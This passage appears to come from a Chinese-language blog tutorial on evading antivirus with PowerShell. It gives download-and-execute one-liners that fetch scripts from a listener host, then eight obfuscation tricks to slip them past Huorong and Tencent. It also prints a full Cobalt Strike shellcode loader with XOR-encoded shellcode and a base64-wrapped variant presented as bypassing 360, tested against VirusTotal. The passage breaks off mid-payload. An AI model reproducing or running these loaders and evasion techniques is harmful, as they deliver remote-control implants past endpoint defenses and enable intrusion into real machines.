<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -NoExit &quot;IEX(New-Object Net.WebClient).DownloadString.(&#x27;&#x27;http://10.10.10.114/shell.ps1&#x27;&#x27;))&quot;</span><br><span class="line"></span><br><span class="line">powershell -NoExit &quot;Invoke-Expression (New-Object Net.WebClient).&quot;D o wn l oad Str in g&quot;(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<br>

<p><img src="/posts/adb63639/18.png" alt="截图"></p>
<p><img src="/posts/adb63639/19.png" alt="截图"></p>
<p>杀软便会对齐进行拦截</p>
<p>通常情况下 可以通过替换函数进行bypass</p>
<p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
<p><code>powershell -NoExit &quot;IEX(New-Object Net.WebClient).DownloadString.(&#39;&#39;http://10.10.10.114/shell.ps1&#39;&#39;))&quot;</code></p>
<br>

<p><img src="/posts/adb63639/20.png" alt="截图"></p>
<br>

<ul>
<li>1.去掉System关键词</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://10.10.10.114:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>2.使用字符串连接+号连接</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3.使用Invoke方法</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>4.变量替代</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>5.关键词使用单双引号引起来</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>6.转义符号</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>7.字符串反转</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:411.01.01.01//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>

<ul>
<li>8.编码执行</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://10.10.10.114:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/21.png" alt="截图"></p>
<p>混淆之后不会被火绒拦截</p>
<p><img src="/posts/adb63639/22.png" alt="截图"></p>
<p>混淆后腾讯管家也可以绕过</p>
<h3 id="base64编码powershell-随机分段-垃圾注释"><a href="#base64编码powershell-随机分段-垃圾注释" class="headerlink" title="base64编码powershell+随机分段+垃圾注释"></a>base64编码powershell+随机分段+垃圾注释</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Dolt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">	Param ($var_module, $var_procedure)		</span></span><br><span class="line"><span class="string">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">	Param (</span></span><br><span class="line"><span class="string">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">	)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckt3PCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMT2R3diMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCi4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMNEhMNEhMNEhIXIyMjIyM=&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">	$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$Dolt</span>  | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$Dolt</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是cs生成原始的powershell payload</p>
<p>这里把 $Dolt @‘’@ 里面的内容进行base64 然后再使用一个变量去base64解码，再更改一下变量名 即可绕过火绒、360</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">$AAA = @&#x27;</span><br><span class="line">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnNBbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($AAA))</span><br><span class="line">If ([IntPtr]::size -eq 8) &#123;</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $bbb | wait-job | Receive-Job</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $bbb  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/adb63639/23.png" alt="截图"></p>
<p><img src="/posts/adb63639/24.png" alt="截图"></p>
<p>上传到VT</p>
<p> <img src="/posts/adb63639/25.png" alt="截图"></p>
<p>发现查杀率还是较高，然后可以差分一些上面的$AAA变量</p>
<p>接下来将$AAA变量就随便分成4部分 然后再拼接起来看看VT上的效果</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$AAA</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnNBbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZXRfZGVsZWdhdGVfdHlwZSBA